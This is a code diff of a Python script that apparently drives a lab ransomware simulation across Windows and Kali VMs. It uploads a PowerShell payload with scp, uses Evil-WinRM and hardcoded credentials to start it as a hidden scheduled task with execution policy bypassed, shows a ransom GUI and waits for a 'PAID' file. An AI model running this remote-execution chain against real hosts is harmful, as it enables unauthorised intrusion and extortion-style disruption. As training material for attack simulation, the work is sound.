@@ -10,19 +10,46 @@ TARGET_WIN = "172.16.1.102"
 USERNAME = "CEO"
 PASSWORD = "CEOPass123!"
 
-def attack_windows():
-    print("[*] Step 1: Attacking Windows VM...")
+def deploy_windows():
+    print("[*] Step 1: Deploying and Triggering Windows VM...")
+    
+    # 1. Upload the PowerShell script via SCP
+    print("[*] Uploading ransom_sim.ps1 to Windows...")
+    scp_cmd = [
+        "scp", "-o", "StrictHostKeyChecking=no",
+        "ransom_sim.ps1",
+        f"{USERNAME}@{TARGET_WIN}:C:/Windows/Temp/"
+    ]
     try:
-        subprocess.run(["python3", "execute_attack.py"], check=True)
+        subprocess.run(scp_cmd, check=True)
+    except subprocess.CalledProcessError:
+        print("[-] SCP to Windows failed. Check credentials/connectivity.")
+        sys.exit(1)
+
+    # 2. Trigger the script via Evil-WinRM
+    print("[*] Triggering Windows GUI via Scheduled Task...")
+    ps_command = (
+        "$Action = New-ScheduledTaskAction -Execute 'powershell.exe' "
+        "-Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\ransom_sim.ps1'; "
+        f"$Principal = New-ScheduledTaskPrincipal -UserId '{USERNAME}' -LogonType Interactive; "
+        "$Settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0; "
+        "Register-ScheduledTask -TaskName 'LabSim' -Action $Action -Principal $Principal -Settings $Settings -Force; "
+        "Start-ScheduledTask -TaskName 'LabSim'"
+    )
+    
+    # Using subprocess.Popen to feed commands into Evil-WinRM
+    evil_winrm_cmd = ["evil-winrm", "-i", TARGET_WIN, "-u", USERNAME, "-p", PASSWORD]
+    try:
+        process = subprocess.Popen(evil_winrm_cmd, stdin=subprocess.PIPE, text=True)
+        process.communicate(input=f"{ps_command}\nexit\n", timeout=15)
         print("[+] Windows attack launched.")
     except Exception as e:
-        print(f"[-] Failed to launch Windows attack: {e}")
+        print(f"[-] Failed to trigger Windows task: {e}")
         sys.exit(1)
 
 def attack_kali():
     print("[*] Step 2: Attacking Kali VM...")
     
-    # The Kali Tkinter Payload (No password prompt here, it just waits to be killed)
     payload_script = """#!/usr/bin/env python3
 import tkinter as tk
 import time
@@ -85,7 +112,6 @@ def monitor_windows(ssh_kali):
     print("    Waiting for PAID.txt: ", end="", flush=True)
     
     try:
-        # Connect and open SFTP to check for the file directly
         win_ssh = paramiko.SSHClient()
         win_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         win_ssh.connect(TARGET_WIN, username=USERNAME, password=PASSWORD)
@@ -95,23 +121,17 @@ def monitor_windows(ssh_kali):
         return
 
     while True:
-        time.sleep(2) # Check every 2 seconds
+        time.sleep(2)
         try:
             # Try to get file stats. If it exists, this succeeds.
             win_sftp.stat('C:\\Windows\\Temp\\PAID.txt')
             
-            # If we get here, the file exists!
             print("\n\n[+] Payment detected on Windows VM! Ending Kali simulation...")
-            
-            # Kill the Kali GUI remotely
             ssh_kali.exec_command("pkill -f ransom_sim.py")
-            
-            # Clean up the paid file
             win_sftp.remove('C:\\Windows\\Temp\\PAID.txt')
             break
             
         except IOError:
-            # File doesn't exist yet, print a dot and keep waiting
             print(".", end="", flush=True)
             pass
         except Exception as e:
@@ -127,7 +147,7 @@ if __name__ == "__main__":
     print("=== STARTING CHAIN REACTION ATTACK ===")
     
     # 1. Hit Windows
-    attack_windows()
+    deploy_windows()
     
     # 2. Hit Kali
     kali_ssh_conn = attack_kali()
